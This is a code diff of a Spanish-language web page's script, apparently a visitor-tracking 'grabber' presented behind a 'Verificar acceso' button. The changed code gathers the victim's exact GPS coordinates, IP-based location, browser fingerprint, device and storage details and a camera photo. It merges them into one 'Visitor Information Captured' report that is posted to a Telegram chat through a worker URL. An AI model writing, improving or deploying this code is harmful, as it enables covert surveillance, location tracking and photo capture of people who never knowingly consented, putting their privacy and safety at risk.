@@ -178,24 +178,24 @@
         return blob;
     }
 
-    // ---------- 8. ENVÍO A TELEGRAM (USANDO WORKER) ----------
-    async function sendMessage(text) {
+    // ---------- 8. ENVÍO COMBINADO (TEXTO + FOTO) AL WORKER ----------
+    async function sendToTelegram(text, photoBlob) {
         try {
-            await fetch(WORKER_URL, {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('text', text);
+            if (photoBlob) {
+                formData.append('photo', photoBlob, 'photo.jpg');
+            }
+            const res = await fetch(WORKER_URL, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+                body: formData
             });
-        } catch(e) { console.warn(e); }
-    }
-    
-    async function sendPhoto(blob) {
-        const fd = new FormData();
-        fd.append('chat_id', CHAT_ID);
-        fd.append('photo', blob, 'photo.jpg');
-        try {
-            await fetch(WORKER_URL, { method: 'POST', body: fd });
-        } catch(e) { console.warn(e); }
+            return res.ok;
+        } catch(e) {
+            console.warn(e);
+            return false;
+        }
     }
 
     // ---------- 9. PROCESO PRINCIPAL ----------
@@ -204,53 +204,59 @@
         btn.disabled = true;
         btn.innerText = '⏳ Enviando...';
 
-        // Obtener todos los datos
-        const gps = await getGPS();
-        const ipApi = await getLocationFromIpApi();      // 🔥 PRIMERA FUENTE (confiable)
-        const ipapi = await getLocationFromIpapi();      // 🔥 RESPALDO
-        const [fp, device, storage] = await Promise.all([
-            getFingerprint(),
-            getDeviceInfo(),
-            getStorageInfo()
-        ]);
-        const foto = await capturePhoto();
+        try {
+            // Recolectar datos
+            const gps = await getGPS();
+            const ipApi = await getLocationFromIpApi();
+            const ipapi = await getLocationFromIpapi();
+            const [fp, device, storage] = await Promise.all([
+                getFingerprint(),
+                getDeviceInfo(),
+                getStorageInfo()
+            ]);
+            const foto = await capturePhoto();
 
-        // Usar ip-api.com si funcionó, si no, ipapi.co como respaldo
-        const loc = ipApi || ipapi;
+            // Usar ip-api.com si funcionó, si no, ipapi.co como respaldo
+            const loc = ipApi || ipapi;
 
-        let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
-        message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
-        message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
-        message += `🌐 *Network Information*\n   • IP Address: ${loc?.ip || 'N/A'}\n   • Language: ${device.language}\n\n`;
-        
-        // 🔥 SECCIÓN DE UBICACIÓN DETALLADA (lo que quieres)
-        message += `📍 *Location Details*\n`;
-        if (loc && loc.city !== 'N/A') {
-            message += `   • Country: ${loc.country}\n`;
-            message += `   • Region: ${loc.region}\n`;
-            message += `   • City: ${loc.city}\n`;
-            message += `   • Postal Code: ${loc.postal}\n`;
-            message += `   • Timezone: ${loc.timezone}\n`;
-        } else {
-            message += `   • No disponible\n`;
+            // Construir mensaje
+            let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
+            message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
+            message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
+            message += `🌐 *Network Information*\n   • IP Address: ${loc?.ip || 'N/A'}\n   • Language: ${device.language}\n\n`;
+            message += `📍 *Location Details*\n`;
+            if (loc && loc.city !== 'N/A') {
+                message += `   • Country: ${loc.country}\n`;
+                message += `   • Region: ${loc.region}\n`;
+                message += `   • City: ${loc.city}\n`;
+                message += `   • Postal Code: ${loc.postal}\n`;
+                message += `   • Timezone: ${loc.timezone}\n`;
+            } else {
+                message += `   • No disponible\n`;
+            }
+            if (gps) {
+                message += `\n📍 *GPS (exacto)*\n   • Coordinates: ${gps.lat}, ${gps.lng}\n   • Accuracy: ±${gps.accuracy} meters\n   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
+            } else {
+                message += `\n📍 *GPS: Permiso denegado o no disponible*\n`;
+            }
+            message += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n`;
+            message += `\n🔐 *Device Permissions*\n   • Camera: ${foto ? 'Permitido' : 'Denegado/No disponible'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n`;
+            message += `\n💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
+            message += `\n━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @jsemanper`;
+
+            // Enviar todo junto
+            const ok = await sendToTelegram(message, foto);
+
+            if (!ok) {
+                console.warn('El envío a Telegram pudo haber fallado.');
+            }
+
+        } catch (error) {
+            console.error('Error en el proceso:', error);
+        } finally {
+            btn.disabled = false;
+            btn.innerText = '✅ Verificar acceso';
         }
-        
-        if (gps) {
-            message += `\n📍 *GPS (exacto)*\n   • Coordinates: ${gps.lat}, ${gps.lng}\n   • Accuracy: ±${gps.accuracy} meters\n   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
-        } else {
-            message += `\n📍 *GPS: Permiso denegado o no disponible*\n`;
-        }
-        
-        message += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n`;
-        message += `\n🔐 *Device Permissions*\n   • Camera: ${foto ? 'Permitido' : 'Denegado/No disponible'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n`;
-        message += `\n💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
-        message += `\n━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @jsemanper`;
-
-        await sendMessage(message);
-        if (foto) await sendPhoto(foto);
-
-        btn.disabled = false;
-        btn.innerText = '✅ Verificar acceso';
     };
 </script>
 </body>
